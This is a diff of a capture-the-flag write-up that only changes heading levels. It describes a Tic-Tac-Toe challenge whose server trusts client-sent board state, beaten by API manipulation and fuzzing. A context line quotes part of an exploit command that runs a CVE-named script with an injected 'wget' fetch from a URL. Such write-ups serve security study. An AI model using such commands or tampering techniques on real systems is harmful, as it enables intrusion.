@@ -134,7 +134,7 @@ python CVE-2025-55182.py -u http://chall.ehax.in:4269/ -c "wget -qO- http://inte
 ![alt text](image.png)
 
 ## tictactoe 
-## Reconnaissance
+### Reconnaissance
 
 The game presents a standard 3×3 Tic-Tac-Toe board backed by a **Minimax** AI — impossible to beat through normal gameplay. The key hint is "break the **protocol**", not the game — pointing toward API manipulation rather than UI interaction.
 
@@ -159,9 +159,9 @@ Content-Type: application/json
 
 The server responds with the AI's next move. No session token or server-side game state — the **entire board state is trusted from the client**.
 
-## Exploitation
+### Exploitation
 
-### Step 1 — Direct State Manipulation (3×3)
+#### Step 1 — Direct State Manipulation (3×3)
 
 Sending a pre-won board state for the player:
 
@@ -189,7 +189,7 @@ The server has anti-cheat logic for 3×3. However, the response leaks a critical
 
 ---
 
-### Step 2 — Fuzzing the `mode` Parameter
+#### Step 2 — Fuzzing the `mode` Parameter
 
 | mode | Result |
 |------|--------|
@@ -201,7 +201,7 @@ The server accepts `"4x4"` and explicitly announces that **ghost sectors** (the 
 
 ---
 
-### Step 3 — Winning via the Ghost Column
+#### Step 3 — Winning via the Ghost Column
 
 Attempting to win on **row 4** (horizontal) → still blocked.
 
